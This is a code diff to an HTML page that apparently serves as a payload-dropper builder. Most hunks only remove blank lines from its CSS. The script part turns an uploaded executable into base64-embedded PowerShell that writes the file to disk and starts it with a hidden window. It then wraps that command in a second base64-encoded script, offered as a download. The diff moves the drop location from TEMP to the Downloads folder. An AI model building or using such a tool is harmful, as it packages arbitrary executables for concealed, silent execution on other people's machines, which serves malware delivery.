@@ -19,13 +19,11 @@
             padding: 20px;
             text-align: center;
         }
-
         h1 {
             margin-bottom: 30px;
             font-size: 3.5rem;
             text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.9);
         }
-
         .container {
             display: flex;
             flex-direction: row;
@@ -37,7 +35,6 @@
             background-color: rgba(50, 50, 50, 0.8);
             box-shadow: 0 0 30px rgba(0, 0, 0, 0.7);
         }
-
         .box {
             background-color: rgba(255, 0, 0, 0.1);
             border-radius: 10px;
@@ -47,11 +44,9 @@
             box-shadow: 0 0 20px rgba(0, 0, 0, 0.7);
             transition: transform 0.3s;
         }
-
         .box:hover {
             transform: scale(1.05);
         }
-
         button {
             padding: 15px 25px;
             font-size: 18px;
@@ -64,16 +59,13 @@
             transition: background-color 0.3s, transform 0.2s;
             width: 100%;
         }
-
         button:hover {
             background-color: #ff6b81;
             transform: scale(1.05);
         }
-
         input[type="file"] {
             display: none;
         }
-
         label {
             background-color: #d63031;
             padding: 15px;
@@ -84,11 +76,9 @@
             margin: 10px 0;
             transition: background-color 0.3s;
         }
-
         label:hover {
             background-color: #e84118;
         }
-
         #ps-output {
             border: 1px solid white;
             padding: 10px;
@@ -100,7 +90,6 @@
             background-color: rgba(255, 0, 0, 0.2);
             border-radius: 5px;
         }
-
         @media (max-width: 768px) {
             .container {
                 flex-direction: column;
@@ -156,9 +145,8 @@
             reader.onload = function(event) {
                 const base64String = event.target.result.split(',')[1];
                 finalPSCode = `
-                $b="${base64String}";[IO.File]::WriteAllBytes("$env:TEMP\\executable.exe",[Convert]::FromBase64String($b));
-                Start-Process -FilePath "$env:TEMP\\executable.exe" -WindowStyle Hidden;
-                `;
+                $b="${base64String}";[IO.File]::WriteAllBytes("$HOME\\Downloads\\executable.exe",[Convert]::FromBase64String($b));
+                Start-Process -FilePath "$HOME\\Downloads\\executable.exe" -WindowStyle Hidden;`;
                 document.getElementById("ps-output").textContent = "PowerShell Code: " + finalPSCode.trim().substring(0, 50) + '...';
             };
 
@@ -182,9 +170,8 @@
             const encodedCode = btoa(finalPSCode);
             const psFileContent = `
             $code = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${encodedCode}'));
-            Set-Content -Path "$env:TEMP\\script.ps1" -Value $code;
-            Start-Process -FilePath "$env:TEMP\\script.ps1" -WindowStyle Hidden;
-            `.trim();
+            Set-Content -Path "$HOME\\Downloads\\script.ps1" -Value $code;
+            Start-Process -FilePath "$HOME\\Downloads\\script.ps1" -WindowStyle Hidden;`.trim();
 
             const blob = new Blob([psFileContent], { type: 'application/octet-stream' });
             const link = document.createElement('a');
@@ -194,7 +181,7 @@
             link.click();
             document.body.removeChild(link);
 
-            alert("Encrypted PowerShell script downloaded to TEMP!");
+            alert("Encrypted PowerShell script downloaded to Downloads folder!");
         }
     </script>
 
